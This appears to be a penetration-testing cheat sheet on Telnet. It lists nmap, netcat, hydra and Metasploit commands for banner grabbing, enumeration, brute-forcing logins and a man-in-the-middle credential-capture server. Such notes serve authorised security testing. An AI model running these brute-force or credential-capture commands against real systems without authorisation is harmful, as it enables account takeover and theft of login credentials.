# Telnet

	- Default Port: 23
	- Telnet is an old network protocol that provides insecure access to computers over a network. It is used to connect to remote systems over TCP/IP networks. However, due to security vulnerabilities, its usage is not recommended, and more secure alternatives like SSH are preferred.

	- Telnet operates on a client-server model, where a system acts as a server and others act as clients. The server grants access to remote devices, while clients connect to the server to send commands and receive responses.

	- Telnet is vulnerable to sniffing attacks. It can also be vulnerable to attacks where it uses default credentials or lacks authentication for access.

### Banner grabbing

```bash
nmap -p 23 $target

telnet $target 23

nc -v $target 23

```

### Enumeration

```bash
nmap -p 23 -sV $target

nmap -n -p 23 --script telnet-encryption $target


```

### Brute 

```bash
 nmap -n -p 23 --script telnet-brute $target  -v

 hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S port ] telnet://$target

 -f (Fast / Exit on success)
 -S port (Forces Hydra to use SSL -S 992 )


use auxiliary/scanner/telnet/telnet_login
msf auxiliary(telnet_login) > set rhosts X.X.X.X
msf auxiliary(telnet_login) > set user_file /path/to/user.txt
msf auxiliary(telnet_login) > set pass_file /path/to/pass.txt
msf auxiliary(telnet_login) > set stop_on_success true
msf auxiliary(telnet_login) > exploit

```

### MITM: Telnet Spoofing with Metasploit
	- A man-in-the-middle attack to capture Telnet login credentials can be performed using the Metasploit module.

```bash

use auxiliary/server/capture/telnet
set srvhost X.X.X.X
set banner Robin Telnet Server
exploit

```
